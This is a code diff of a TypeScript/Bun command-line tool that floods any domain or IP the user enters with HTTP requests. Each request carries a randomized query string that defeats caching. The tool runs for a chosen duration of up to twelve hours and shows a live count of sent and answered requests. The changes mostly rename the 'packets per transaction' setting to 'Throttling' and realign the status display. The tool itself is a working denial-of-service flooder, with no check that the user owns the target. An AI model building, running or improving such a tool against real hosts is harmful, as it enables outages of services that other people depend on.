@@ -36,11 +36,11 @@ const question = (query: string): Promise<string> =>
 const run = async () => {
   print();
 
-  const target_question = await question('Target (IP/Domain): ');
+  const target_question = await question('Target: ');
 
   print();
 
-  const target: string = target_question
+  const target = target_question
     .toLowerCase()
     .trim()
     .replace(/^https?:\/\//, '')
@@ -63,34 +63,34 @@ const run = async () => {
     return;
   }
 
-  console.log(`Target (IP/Domain): ${target}`);
+  console.log(`Target: ${target}`);
 
-  const ppt_question: string = await question('PPT (Packets Per Transaction): ');
+  const throttling_question = await question('Throttling: ');
 
   print();
 
-  if (!ppt_question) {
-    console.log('Field ppt cannot be left blank.');
+  if (!throttling_question) {
+    console.log('Field throttling cannot be left blank.');
 
     setTimeout(() => void run(), 2500);
 
     return;
   }
 
-  if (isNaN(Number(ppt_question))) {
-    console.log('Field ppt must be a number.');
+  if (isNaN(Number(throttling_question))) {
+    console.log('Field throttling must be a number.');
 
     setTimeout(() => void run(), 2500);
 
     return;
   }
 
-  const ppt: number = Math.max(1, Math.min(Number(ppt_question), 100));
+  const throttling = Math.max(1, Math.min(Number(throttling_question), 100));
 
-  console.log(`Target (IP/Domain): ${target}`);
-  console.log(`PPT (Packets Per Transaction): ${ppt.toString()}`);
+  console.log(`Target: ${target}`);
+  console.log(`Throttling: ${throttling.toString()}`);
 
-  const duration_question: string = await question('Duration (s): ');
+  const duration_question = await question('Duration (s): ');
 
   print();
 
@@ -110,34 +110,34 @@ const run = async () => {
     return;
   }
 
-  const duration: number = Math.max(1, Math.min(Number(duration_question), 43200));
+  const duration = Math.max(1, Math.min(Number(duration_question), 43200));
 
-  console.log(`Target (IP/Domain): ${target}`);
-  console.log(`PPT (Packets Per Transaction): ${ppt.toString()}`);
+  console.log(`Target: ${target}`);
+  console.log(`Throttling: ${throttling.toString()}`);
   console.log(`Duration (s): ${duration.toString()}`);
 
   console.log('');
-  console.log('Status                       \x1b[33mPreparing... ⟳', '\x1b[0m');
-  console.log('Packets Sent                 \x1b[90m--', '\x1b[0m');
-  console.log('Successful Resp.             \x1b[90m--', '\x1b[0m');
-  console.log('Unsuccessful Resp.           \x1b[90m--', '\x1b[0m');
-  console.log('Remaining Time               \x1b[90m--', '\x1b[0m');
+  console.log('Status                          \x1b[33mPreparing... ⟳', '\x1b[0m');
+  console.log('Packets Sent                    \x1b[90m--', '\x1b[0m');
+  console.log('Successful Resp.                \x1b[90m--', '\x1b[0m');
+  console.log('Unsuccessful Resp.              \x1b[90m--', '\x1b[0m');
+  console.log('Remaining Time                  \x1b[90m--', '\x1b[0m');
   console.log('');
 
   await Bun.sleep(1000);
 
   print();
 
-  console.log(`Target (IP/Domain): ${target}`);
-  console.log(`PPT (Packets Per Transaction): ${ppt.toString()}`);
+  console.log(`Target: ${target}`);
+  console.log(`Throttling: ${throttling.toString()}`);
   console.log(`Duration (s): ${duration.toString()}`);
 
   console.log('');
-  console.log('Status                       \x1b[33mAlmost Ready... ⟳', '\x1b[0m');
-  console.log('Packets Sent                 \x1b[90m--', '\x1b[0m');
-  console.log('Successful Resp.             \x1b[90m--', '\x1b[0m');
-  console.log('Unsuccessful Resp.           \x1b[90m--', '\x1b[0m');
-  console.log('Remaining Time               \x1b[90m--', '\x1b[0m');
+  console.log('Status                          \x1b[33mAlmost Ready... ⟳', '\x1b[0m');
+  console.log('Packets Sent                    \x1b[90m--', '\x1b[0m');
+  console.log('Successful Resp.                \x1b[90m--', '\x1b[0m');
+  console.log('Unsuccessful Resp.              \x1b[90m--', '\x1b[0m');
+  console.log('Remaining Time                  \x1b[90m--', '\x1b[0m');
 
   console.log('');
 
@@ -150,7 +150,7 @@ const run = async () => {
   let remaining_time = duration;
 
   intervals.STRESSING = setInterval(() => {
-    for (let i = 0; i < ppt; i++) {
+    for (let i = 0; i < throttling; i++) {
       packets_sent++;
 
       fetch(`http://${target}?${Math.random().toString()}=${Math.random().toString()}`, {
@@ -176,16 +176,16 @@ const run = async () => {
   setInterval(() => {
     print();
 
-    console.log(`Target (IP/Domain): ${target}`);
-    console.log(`PPT (Packets Per Transaction): ${ppt.toString()}`);
+    console.log(`Target: ${target}`);
+    console.log(`Throttling: ${throttling.toString()}`);
     console.log(`Duration (s): ${duration.toString()}`);
 
     console.log('');
-    console.log(`Status                       ${running ? '\x1b[37mRunning ▶' : '\x1b[31mStopped ■'}`, '\x1b[0m');
-    console.log(`Packets Sent                 ${previous_packets_sent !== packets_sent ? '\x1b[34m' : '\x1b[90m'}${packets_sent.toString()} ↑`, '\x1b[0m');
-    console.log(`Successful Resp.             ${previous_successful_responses !== successful_responses ? '\x1b[32m' : '\x1b[90m'}${successful_responses.toString()} ↓`, '\x1b[0m');
-    console.log(`Unsuccessful Resp.           ${previous_unsuccessful_responses !== unsuccessful_responses ? '\x1b[31m' : '\x1b[90m'}${unsuccessful_responses.toString()} ⇣`, '\x1b[0m');
-    console.log(`Remaining Time               ${previous_remaining_time !== remaining_time ? '\x1b[33m' : '\x1b[90m'}${Dayjs.duration(remaining_time, 'seconds').format('HH:mm:ss')} ⏱︎`, '\x1b[0m');
+    console.log(`Status                          ${running ? '\x1b[37mRunning ▶' : '\x1b[31mStopped ■'}`, '\x1b[0m');
+    console.log(`Packets Sent                    ${previous_packets_sent !== packets_sent ? '\x1b[34m' : '\x1b[90m'}${packets_sent.toString()} ↑`, '\x1b[0m');
+    console.log(`Successful Resp.                ${previous_successful_responses !== successful_responses ? '\x1b[32m' : '\x1b[90m'}${successful_responses.toString()} ↓`, '\x1b[0m');
+    console.log(`Unsuccessful Resp.              ${previous_unsuccessful_responses !== unsuccessful_responses ? '\x1b[31m' : '\x1b[90m'}${unsuccessful_responses.toString()} ⇣`, '\x1b[0m');
+    console.log(`Remaining Time                  ${previous_remaining_time !== remaining_time ? '\x1b[33m' : '\x1b[90m'}${Dayjs.duration(remaining_time, 'seconds').format('HH:mm:ss')} ⏱︎`, '\x1b[0m');
 
     console.log('');
 
